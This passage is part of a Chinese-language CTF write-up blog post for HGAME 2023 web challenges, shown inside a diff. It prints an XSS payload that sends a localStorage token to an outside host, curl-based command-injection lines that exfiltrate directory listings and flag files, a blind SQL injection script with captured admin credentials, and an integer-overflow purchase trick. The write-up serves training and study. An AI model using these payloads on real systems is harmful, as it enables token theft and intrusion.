item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>过滤<code>on</code>主要过滤了各种事件，阻止我们给按钮绑定事件属性，<code>localStorage</code>阻止我们获取token，<code>XMLHttpRequest</code>阻止我们发起http请求来带出token</p>
+<p>这个过滤还是比较绕过的，我们可以直接用<code>&lt;&gt;</code>构造script标签，然后动态给标签绑定属性就可以了，至于关键字的过滤，可以base64编码然后使用eval函数来执行即可。XMLHttpRequest可以使用Jquery来绕过</p>
+<p>绑定事件代码如下(把url换成自己的url)：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;button&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;$.<span class="title function_">get</span>(<span class="string">&#x27;http://your_url/?flag=&#x27;</span>+<span class="built_in">eval</span>(<span class="string">&#x27;window.localStorage.token&#x27;</span>));&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>对上面的代码进行base64编码即可绕过检测，最终payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J1dHRvbicpLm9uY2xpY2sgPSBmdW5jdGlvbigpeyQuZ2V0KCdodHRwOi8vcThoZjl3LmNleWUuaW8vP2ZsYWc9JytldmFsKCd3aW5kb3cubG9jYWxTdG9yYWdlLnRva2VuJykpO307&#x27;</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击方法，直接点击share按钮，然后抓包修改最后一个属性（记得payload里面的双引号要转义一下）</p>
+<p><img src="https://s2.loli.net/2023/01/17/IiRMvmDPjXUdtEZ.png" alt="image.png"></p>
+<p>然后在自己的服务器即可收到token，解码即可<br><img src="https://s2.loli.net/2023/01/17/dWNB8JUaVboIC4Y.png" alt="image.png"></p>
+<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><p>ping功能的命令执行，但是无回显，所以只能通过curl等带出命令执行结果。<br>过滤了空格，可以使用${IFS}来绕过，cat命令被过滤，使用tail app.py命令可以读取源文件，关键代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>()</span><br><span class="line">	res = os.system(<span class="string">&quot;ping -c 5 -w 15 &quot;</span> + ip) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">ip</span>): </span><br><span class="line">    blacklist = [<span class="string">&quot;;&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;\+&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;flag&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist: </span><br><span class="line">        match = re.search(black, ip, re.M | re.I) </span><br><span class="line">        <span class="built_in">print</span>(match) </span><br><span class="line">    <span class="keyword">if</span> match: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> </span><br></pre></td></tr></table></figure>
+<p>可以看到过滤了重定向符，那么就无法将命令执行结果写入文件然后读文件，可以使用如下命令来带出命令执行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl$&#123;IFS&#125;q8hf9w.ceye.io?a=`command`</span><br></pre></td></tr></table></figure>
+
+<p>但是这样的话列目录的时候只能带出第一个目录，需要找到某种方法将目录进行编码输出，base64命令有一个参数<code>-w</code>可以实现这个功能，最终payload如下：</p>
+<p>列目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl$&#123;IFS&#125;q8hf9w.ceye.io?a=`ls$&#123;IFS&#125;/|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0`</span><br></pre></td></tr></table></figure>
+
+<p>获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|curl$&#123;IFS&#125;q8hf9w.ceye.io?a=`tail$&#123;IFS&#125;/fl\ag_is_here_haha|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0`</span><br></pre></td></tr></table></figure>
+
+<h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><p>只能进行盲注，获取管理员用户名和密码<br>题目存在过滤，测试过滤规则如下，还有substring也被过滤了<br><img src="https://s2.loli.net/2023/02/05/PDp4qSKWvjrktNf.png" alt="image.png"></p>
+<p>使用left函数来进行注入，由于<code>=</code>被过滤，所以使用<code>&lt;&gt;</code>，表名要相等的话可以使用regexp，要注意regexp不区分大小写，可以转成十六进制，除此之外也可以使用<code>in</code>语句</p>
+<p>代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://week-3.hgame.lwsec.cn:30203/login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># admin</span></span><br><span class="line">cookies= &#123;</span><br><span class="line">    <span class="string">&#x27;SESSION&#x27;</span>: <span class="string">&#x27;MTY3NTU2OTMxMnxEdi1CQkFFQ180SUFBUkFCRUFBQUl2LUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBWUFCSFJsYzNRPXyPfoeasURTewWzOmSKuOszqdARLYkr37xGpU4f_aNvKg==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># tablename: User1nf0mAt1on</span></span><br><span class="line"><span class="comment"># column: id,UsErN4me,PAssw0rD</span></span><br><span class="line"><span class="comment"># ID: 1,2</span></span><br><span class="line"><span class="comment"># USERN4ME: hgAmE2023HAppYnEwyEAr,testuser</span></span><br><span class="line"><span class="comment"># PASSW0RD: WeLc0meT0hgAmE2023hAPPySql,testpassword</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">129</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &#x27;username&#x27;: &quot;&#x27;/**/or/**/left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()),&#123;&#125;)&lt;&gt;&#x27;&#123;&#125;&#x27;#&quot;.format(len(target)+1, target+chr(i)),</span></span><br><span class="line">            <span class="comment"># &#x27;username&#x27;: &quot;&#x27;/**/or/**/hex(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;),&#123;&#125;))&lt;&gt;&#x27;&#123;&#125;&#x27;#&quot;.format(len(target)+1, binascii.b2a_hex(bytes(target+chr(i), encoding=&#x27;utf-8&#x27;)).decode()),</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#x27;/**/or/**/hex(left((select/**/group_concat(PAssw0rD)/**/from/**/User1nf0mAt1on),&#123;&#125;))&lt;&gt;&#x27;&#123;&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(target)+<span class="number">1</span>, binascii.b2a_hex(<span class="built_in">bytes</span>(target+<span class="built_in">chr</span>(i), encoding=<span class="string">&#x27;utf-8&#x27;</span>)).decode()),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;testpassword&#x27;</span></span><br><span class="line">        &#125;   </span><br><span class="line">        res=requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Failed!&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            target += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">128</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+
+<p>然后用admin用户登录之后访问home页面即可获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><p>go语言编写的框架，在购买商品时存在整数溢出问题：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuyProduct</span><span class="params">(context *gin.Context)</span></span> &#123;</span><br><span class="line">	username, _ := context.Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line"></span><br><span class="line">	user, err := db.GetUserByUsername(username.(<span class="type">string</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	product := context.Query(<span class="string">&quot;product&quot;</span>)</span><br><span class="line">	price, err := db.GetProductPrice(product)</span><br><span class="line">	number, err := strconv.Atoi(context.Query(<span class="string">&quot;number&quot;</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">//校验是否买的起</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> || number &lt; <span class="number">1</span> || user.Balance &lt; <span class="type">uint</span>(number) * price&#123;</span><br><span class="line">		context.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;invalid request&quot;</span>&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>每个账户只有10个硬币，所以溢出后要低于10，那么我们购买最便宜的10块钱的商品，这样就需要我们数量x单价计算的总金额为能够被10整除的数。那么计算一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span>**<span class="number">64</span></span><br><span class="line"><span class="number">18446744073709551616</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span>**<span class="number">64</span>+<span class="number">4</span></span><br><span class="line"><span class="number">18446744073709551620</span></span><br></pre></td></tr></table></figure>
+
+<p>所以只要买<code>1844674407370955162</code>件即可溢出成功购买，然后不断卖出，知道卖出的钱能够买flag即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2023/03/11/hgame2023/">http://example.com/2023/03/11/hgame2023/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/11/02/jndi-inj-rmi/">JNDI注入分析-RMI注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
